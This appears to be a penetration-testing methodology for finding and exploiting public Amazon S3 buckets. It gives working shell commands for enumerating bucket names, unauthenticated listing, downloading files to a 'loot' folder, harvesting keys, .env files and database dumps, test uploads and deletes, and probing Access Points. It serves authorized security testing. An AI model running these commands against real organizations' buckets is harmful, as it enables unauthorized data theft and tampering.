Repeatability: per_asset
Prerequisites: Unauthenticated — no AWS credentials required
Description: This methodology covers the discovery and exploitation of publicly accessible Amazon S3 buckets associated with a target organization. S3 buckets are a frequent source of critical data exposure when misconfigured. Testing begins with enumeration of bucket names using permutation-based wordlists derived from the target's domain, brand names, and known naming conventions. Discovered buckets are then probed for overly permissive ACLs and bucket policies that allow unauthenticated LIST, GET, PUT, or DELETE operations. Additional procedures target the identification of sensitive files (credentials, keys, backups, environment configurations), publicly hosted static websites that may leak internal data, and misconfigured S3 Access Points that bypass intended bucket-level restrictions. All checks are performed without AWS credentials using the --no-sign-request flag or equivalent unsigned HTTP requests.
Tags: s3, bucket, public-access, unauthenticated, data-exposure, misconfiguration
Potential Severity: critical

------------------------------------------
Procedure 0 — Enumerate S3 Buckets via Permutation Wordlists
Tools: cloud_enum, s3recon, bucket_finder, grayhatwarfare (web)
Intrusiveness: passive
Description: Discover S3 bucket names belonging to the target organization by generating permutations of the target's domain name, brand, product names, and common naming patterns (dev, staging, backup, logs, etc.). Multiple tools are used in parallel to maximize coverage. Discovered bucket names form the input for all subsequent procedures.

Step 1: Prepare a keywords file containing target-specific terms (company name, domain, product names, abbreviations):
  echo -e "acmecorp\nacme\nacme-corp\nacme-dev\nacme-prod\nacme-staging\nacme-backup\nacme-logs\nacme-assets\nacme-data\nacme-internal" > /tmp/target_keywords.txt

Step 2: Run cloud_enum against the target keywords to discover S3 buckets (and optionally Azure blobs / GCP buckets):
  cloud_enum -k /tmp/target_keywords.txt -l cloud_enum_results.txt
  Note: cloud_enum tests s3.amazonaws.com permutations automatically.

Step 3: Run s3recon with the same keyword list for additional permutation coverage:
  s3recon /tmp/target_keywords.txt --output s3recon_results.json
  Alternatively with a larger wordlist:
  s3recon /tmp/target_keywords.txt -w /path/to/permutations.txt --output s3recon_results.json

Step 4: Run bucket_finder with a wordlist of candidate bucket names (one per line):
  bucket_finder --download /tmp/target_keywords.txt --region us-east-1 | tee bucket_finder_results.txt

Step 5: Manually search GrayhatWarfare (https://buckets.grayhatwarfare.com/) for the target's domain and brand names to find indexed open buckets.

Step 6: Consolidate all discovered bucket names into a single deduplicated list:
  cat cloud_enum_results.txt s3recon_results.json bucket_finder_results.txt | grep -oP '[a-zA-Z0-9.\-]+\.s3\.amazonaws\.com|s3://[a-zA-Z0-9.\-]+' | sort -u > discovered_buckets.txt

Step 7: Validate that each bucket exists by sending an HTTP HEAD request:
  while read bucket; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://${bucket}.s3.amazonaws.com")
    echo "$bucket -> HTTP $STATUS"
  done < discovered_buckets.txt
  Note: HTTP 200/403 = exists, HTTP 404 = does not exist.

Flag: Any S3 bucket confirmed to exist (HTTP 200 or 403) that is associated with the target organization constitutes a finding for further testing.

------------------------------------------
Procedure 1 — Test Discovered Buckets for Public LIST Access
Tools: aws cli, curl
Intrusiveness: low
Description: Test each discovered bucket for unauthenticated listing of its contents. A publicly listable bucket exposes the full inventory of stored objects (keys, sizes, timestamps), enabling an attacker to identify high-value targets for data exfiltration. Public LIST access is one of the most common S3 misconfigurations.

Step 1: Attempt to list the contents of each bucket using the AWS CLI without credentials:
  aws s3 ls s3://BUCKET_NAME --no-sign-request
  If the bucket is in a non-default region, specify it:
  aws s3 ls s3://BUCKET_NAME --no-sign-request --region REGION

Step 2: Alternatively, use curl to send an unsigned GET request to the bucket's REST endpoint:
  curl -s "https://BUCKET_NAME.s3.amazonaws.com/" | xmllint --format -
  Note: A successful response returns XML containing <ListBucketResult> with <Contents> elements.

Step 3: If the bucket returns truncated results (IsTruncated=true), paginate through all objects:
  aws s3api list-objects-v2 --bucket BUCKET_NAME --no-sign-request --output json > bucket_listing.json
  For very large buckets:
  aws s3api list-objects-v2 --bucket BUCKET_NAME --no-sign-request --max-keys 1000 --starting-token TOKEN

Step 4: Save the full object listing for analysis in subsequent procedures:
  aws s3 ls s3://BUCKET_NAME --no-sign-request --recursive > BUCKET_NAME_full_listing.txt

Step 5: Automate across all discovered buckets:
  while read bucket; do
    echo "=== Testing: $bucket ==="
    aws s3 ls "s3://${bucket}" --no-sign-request 2>&1
  done < discovered_buckets.txt | tee list_access_results.txt

Flag: Any bucket that returns a listing of objects (non-error XML with <Contents> elements or CLI directory listing) without authentication is a finding. This indicates a publicly listable bucket with an overly permissive ACL or bucket policy.

------------------------------------------
Procedure 2 — Test Discovered Buckets for Public GET Access on Objects
Tools: aws cli, curl, wget
Intrusiveness: low
Description: Test whether objects within discovered buckets can be downloaded without authentication. Even if a bucket does not permit LIST, individual objects may be accessible via direct GET requests if their keys are known or guessable. Successful unauthenticated GET access enables data exfiltration.

Step 1: From the listing obtained in Procedure 1, select sample objects and attempt to download them:
  aws s3 cp s3://BUCKET_NAME/path/to/object.txt ./loot/ --no-sign-request

Step 2: Alternatively, use curl or wget to download objects via HTTPS:
  curl -s -O "https://BUCKET_NAME.s3.amazonaws.com/path/to/object.txt"
  wget -q "https://BUCKET_NAME.s3.amazonaws.com/path/to/object.txt"

Step 3: If the bucket does not allow LIST, attempt to access commonly named objects by guessing keys:
  for key in index.html robots.txt config.yml .env backup.sql database.sql error.log readme.md; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://BUCKET_NAME.s3.amazonaws.com/${key}")
    echo "${key} -> HTTP ${STATUS}"
  done

Step 4: Check if objects are accessible via path-style and virtual-hosted-style URLs:
  curl -s -o /dev/null -w "%{http_code}" "https://s3.amazonaws.com/BUCKET_NAME/object_key"
  curl -s -o /dev/null -w "%{http_code}" "https://BUCKET_NAME.s3.amazonaws.com/object_key"

Step 5: Test for GET access on a range of objects across all listable buckets:
  while read line; do
    bucket=$(echo "$line" | awk '{print $1}')
    key=$(echo "$line" | awk '{print $2}')
    aws s3 cp "s3://${bucket}/${key}" /tmp/test_download --no-sign-request 2>&1
    echo "$bucket/$key -> $?"
  done < sample_objects.txt

Flag: Any object that can be downloaded (HTTP 200 or successful aws s3 cp) without authentication is a finding. This indicates public read access on the object or bucket, enabling unauthenticated data exfiltration.

------------------------------------------
Procedure 3 — Test Discovered Buckets for Public PUT / DELETE Access
Tools: aws cli, curl
Intrusiveness: high
Description: [DOCUMENT ONLY] Test whether discovered buckets allow unauthenticated write (PUT) or delete (DELETE) operations. Public write access can be leveraged for defacement, malware hosting, supply-chain attacks (replacing legitimate assets), or data destruction. Due to the destructive and potentially illegal nature of these operations, this procedure should be conducted with extreme caution and only with explicit written authorization. In most engagements, this is a document-only finding inferred from bucket policy analysis rather than active exploitation.

Step 1: [DOCUMENT ONLY] Attempt to upload a harmless proof-of-concept file to the bucket:
  echo "pentesting-poc-$(date +%s)" > /tmp/poc_upload.txt
  aws s3 cp /tmp/poc_upload.txt s3://BUCKET_NAME/pentest_poc_upload_test.txt --no-sign-request
  Note: Use a clearly identifiable filename that can be easily traced back and cleaned up.

Step 2: [DOCUMENT ONLY] Verify the upload was successful by attempting to read it back:
  aws s3 cp s3://BUCKET_NAME/pentest_poc_upload_test.txt /tmp/verify_upload.txt --no-sign-request
  cat /tmp/verify_upload.txt

Step 3: [DOCUMENT ONLY] Immediately remove the test file after confirming write access:
  aws s3 rm s3://BUCKET_NAME/pentest_poc_upload_test.txt --no-sign-request

Step 4: [DOCUMENT ONLY] Alternatively, test PUT via curl without actually writing data (use a dry-run approach by checking ACL grants):
  curl -s "https://BUCKET_NAME.s3.amazonaws.com/?acl" | xmllint --format -
  Look for <Grant> entries with <Grantee xsi:type="Group"> containing URI "http://acs.amazonaws.com/groups/global/AllUsers" or "http://acs.amazonaws.com/groups/global/AuthenticatedUsers" with <Permission>WRITE</Permission> or <Permission>FULL_CONTROL</Permission>.

Step 5: [DOCUMENT ONLY] Test for DELETE permissions:
  aws s3 rm s3://BUCKET_NAME/pentest_poc_upload_test.txt --no-sign-request
  Note: Only attempt this on the file you uploaded in Step 1. Never delete pre-existing objects.

Step 6: Check the bucket policy directly (if readable) for write/delete grants:
  aws s3api get-bucket-policy --bucket BUCKET_NAME --no-sign-request 2>&1
  Look for Effect: Allow with Action: s3:PutObject, s3:DeleteObject, or s3:* with Principal: "*".

Flag: Any bucket that allows unauthenticated PUT (upload) or DELETE operations is a critical finding. Even if only tested passively via ACL/policy review, the presence of WRITE or FULL_CONTROL grants to AllUsers or AuthenticatedUsers constitutes a finding.

------------------------------------------
Procedure 4 — Search for Sensitive Files in Public Buckets
Tools: aws cli, grep, trufflehog, gitleaks
Intrusiveness: low
Description: Analyze the contents of publicly listable and readable buckets for sensitive files including private keys (.pem, .key, .ppk), credential files (credentials, .aws/credentials, .env), database dumps (.sql, .bak, .dump), backup archives (.tar.gz, .zip containing sensitive data), and configuration files that may contain secrets. Discovery of such files constitutes a critical data exposure.

Step 1: From the full bucket listing obtained in Procedure 1, search for sensitive file patterns:
  grep -iE '\.(pem|key|ppk|pfx|p12|jks|keystore)$' BUCKET_NAME_full_listing.txt
  grep -iE '\.(env|cfg|conf|config|ini|yml|yaml|json|xml|properties|toml)$' BUCKET_NAME_full_listing.txt
  grep -iE '(credentials|password|secret|backup|database|dump|export)' BUCKET_NAME_full_listing.txt
  grep -iE '\.(sql|bak|dump|gz|tar|zip|7z|rar)$' BUCKET_NAME_full_listing.txt

Step 2: Download identified sensitive files for analysis (within scope and authorization):
  aws s3 cp s3://BUCKET_NAME/path/to/sensitive_file.pem ./loot/ --no-sign-request
  aws s3 cp s3://BUCKET_NAME/.env ./loot/ --no-sign-request

Step 3: Recursively download the bucket (or a targeted subset) for offline analysis:
  aws s3 sync s3://BUCKET_NAME ./loot/BUCKET_NAME/ --no-sign-request --exclude "*" \
    --include "*.pem" --include "*.key" --include "*.env" --include "*.sql" \
    --include "*.bak" --include "*.conf" --include "*.yml" --include "credentials*"

Step 4: Run trufflehog against downloaded content to detect embedded secrets, API keys, and tokens:
  trufflehog filesystem ./loot/BUCKET_NAME/ --json > trufflehog_results.json

Step 5: Run gitleaks against downloaded content for additional secret detection:
  gitleaks detect --source ./loot/BUCKET_NAME/ --report-path gitleaks_results.json --report-format json

Step 6: Manually review high-value files:
  - .env files for database passwords, API keys, third-party service tokens
  - .pem / .key files for private SSH or TLS keys
  - .sql / .bak files for database dumps containing PII or credentials
  - terraform.tfstate files for infrastructure secrets
  - docker-compose.yml for hardcoded credentials
  - .git/ directories for repository history containing secrets

Flag: Any sensitive file (private keys, credentials, database dumps, environment files with secrets, PII, backup archives) found in a publicly accessible S3 bucket is a critical finding representing a confirmed data exposure.

------------------------------------------
Procedure 5 — Check for Public Static Website Hosting with Sensitive Content
Tools: aws cli, curl, wget, gobuster, ffuf
Intrusiveness: low
Description: S3 buckets can be configured for static website hosting, which makes the bucket contents accessible via a public HTTP endpoint (http://BUCKET_NAME.s3-website-REGION.amazonaws.com). This hosting configuration may inadvertently expose internal documentation, admin panels, API documentation, or debug/staging content not intended for public access. The website endpoint may also reveal directory listings or error pages that leak information.

Step 1: Determine if the bucket has static website hosting enabled by querying the website endpoint:
  curl -s -o /dev/null -w "%{http_code}" "http://BUCKET_NAME.s3-website-us-east-1.amazonaws.com"
  Note: Try multiple regions if the region is unknown:
  for region in us-east-1 us-west-2 eu-west-1 ap-southeast-1 eu-central-1; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" "http://BUCKET_NAME.s3-website-${region}.amazonaws.com")
    echo "${region} -> HTTP ${STATUS}"
  done
  HTTP 200 or 302 indicates website hosting is enabled. HTTP 404 with S3-specific error may also confirm it.

Step 2: Retrieve the website content and inspect for sensitive information:
  curl -s "http://BUCKET_NAME.s3-website-REGION.amazonaws.com/" | tee website_index.html
  wget -r -l 2 -np -q "http://BUCKET_NAME.s3-website-REGION.amazonaws.com/" -P ./loot/website/

Step 3: Brute-force paths on the website endpoint to discover hidden content:
  gobuster dir -u "http://BUCKET_NAME.s3-website-REGION.amazonaws.com" -w /usr/share/wordlists/dirb/common.txt -t 20 -o gobuster_results.txt
  Alternatively with ffuf:
  ffuf -u "http://BUCKET_NAME.s3-website-REGION.amazonaws.com/FUZZ" -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302 -o ffuf_results.json -of json

Step 4: Check for common sensitive paths on the website:
  for path in admin/ login/ api/ docs/ swagger/ internal/ debug/ config/ .git/ .env backup/ wp-admin/ phpinfo.php; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" "http://BUCKET_NAME.s3-website-REGION.amazonaws.com/${path}")
    echo "${path} -> HTTP ${STATUS}"
  done

Step 5: Inspect the website's error document for information disclosure:
  curl -s "http://BUCKET_NAME.s3-website-REGION.amazonaws.com/nonexistent-$(date +%s)" | tee error_page.html
  Note: Custom error pages may reveal internal paths, stack traces, or application details.

Step 6: Check if the website endpoint is serving content via a custom domain (CNAME):
  dig CNAME www.targetdomain.com +short
  Note: If the CNAME points to an S3 website endpoint, the bucket is directly associated with the target.

Flag: Any S3 static website hosting endpoint that serves sensitive content (internal documentation, credentials, admin interfaces, API keys, debug information, staging/development data) or exposes directory listings is a finding.

------------------------------------------
Procedure 6 — Identify Misconfigured Access Points with Public Access
Tools: aws cli, curl
Intrusiveness: low
Description: S3 Access Points provide customized access policies for shared datasets. Misconfigured Access Points may grant public (unauthenticated) access to bucket data even when the underlying bucket policy is restrictive. Access Points have their own ARNs and DNS names (ACCESSPOINT_NAME-ACCOUNT_ID.s3-accesspoint.REGION.amazonaws.com), and each can have an independent access policy. If the Access Point's policy allows Principal: "*" or lacks the block public access settings, it creates a bypass path for unauthenticated data access.

Step 1: Attempt to discover Access Point hostnames using DNS brute-forcing or naming convention guessing:
  for ap_name in data public files shared assets api media uploads downloads; do
    for region in us-east-1 us-west-2 eu-west-1; do
      HOSTNAME="${ap_name}-ACCOUNT_ID.s3-accesspoint.${region}.amazonaws.com"
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://${HOSTNAME}")
      if [ "$STATUS" != "000" ]; then
        echo "Found: ${HOSTNAME} -> HTTP ${STATUS}"
      fi
    done
  done
  Note: Replace ACCOUNT_ID with the target's AWS account ID if known.

Step 2: If an Access Point hostname resolves, attempt to list objects through it:
  aws s3api list-objects-v2 --bucket arn:aws:s3:REGION:ACCOUNT_ID:accesspoint/ACCESSPOINT_NAME --no-sign-request

Step 3: Attempt to retrieve the Access Point policy:
  aws s3control get-access-point-policy --account-id ACCOUNT_ID --name ACCESSPOINT_NAME --no-sign-request 2>&1
  Note: This typically requires authentication, but the attempt may reveal error messages that confirm the Access Point exists.

Step 4: Test direct object retrieval via the Access Point DNS name:
  curl -s -o /dev/null -w "%{http_code}" "https://ACCESSPOINT_NAME-ACCOUNT_ID.s3-accesspoint.REGION.amazonaws.com/test_object"
  aws s3 cp s3://arn:aws:s3:REGION:ACCOUNT_ID:accesspoint/ACCESSPOINT_NAME/object_key ./loot/ --no-sign-request

Step 5: If the target account ID is unknown, attempt to derive it from previously discovered bucket information:
  curl -s "https://BUCKET_NAME.s3.amazonaws.com/?acl" | grep -oP 'id="[a-f0-9]+"'
  Note: The canonical user ID in the ACL can sometimes be correlated to an account ID using public datasets or other OSINT methods.

Step 6: Check for Multi-Region Access Points (MRAP) which use a different endpoint format:
  curl -s -o /dev/null -w "%{http_code}" "https://MRAP_ALIAS.accesspoint.s3-global.amazonaws.com"
  Note: MRAP aliases are opaque strings and harder to enumerate, but may be discovered through DNS records, JavaScript source code, or API traffic analysis.

Flag: Any S3 Access Point that permits unauthenticated listing or retrieval of objects is a critical finding. The presence of an Access Point policy with Principal: "*" and no block public access settings enabled constitutes a misconfiguration finding even if active exploitation is not attempted.

------------------------------------------
References:
- AWS S3 Security Best Practices: https://docs.aws.amazon.com/AmazonS3/latest/userguide/security-best-practices.html
- AWS S3 Bucket Policy Examples: https://docs.aws.amazon.com/AmazonS3/latest/userguide/example-bucket-policies.html
- AWS S3 Access Points: https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-points.html
- AWS S3 Block Public Access: https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-control-block-public-access.html
- AWS S3 Static Website Hosting: https://docs.aws.amazon.com/AmazonS3/latest/userguide/WebsiteHosting.html
- HackTricks Cloud — AWS S3 Enumeration: https://cloud.hacktricks.wiki/pentesting-cloud/aws-security/aws-services/s3-bucket-enumeration.html
- HackTricks Cloud — AWS S3 Exploitation: https://cloud.hacktricks.wiki/pentesting-cloud/aws-security/aws-services/s3-bucket-exploitation.html
- Rhino Security Labs — S3 Bucket Enumeration: https://rhinosecuritylabs.com/penetration-testing/penetration-testing-aws-storage/
- cloud_enum: https://github.com/initstring/cloud_enum
- s3recon: https://github.com/clarketm/s3recon
- bucket_finder: https://github.com/digininja/bucket_finder
- GrayhatWarfare Open Buckets: https://buckets.grayhatwarfare.com/
- trufflehog: https://github.com/trufflesecurity/trufflehog
- gitleaks: https://github.com/gitleaks/gitleaks
- Flaws.cloud (S3 Misconfiguration Training): http://flaws.cloud/
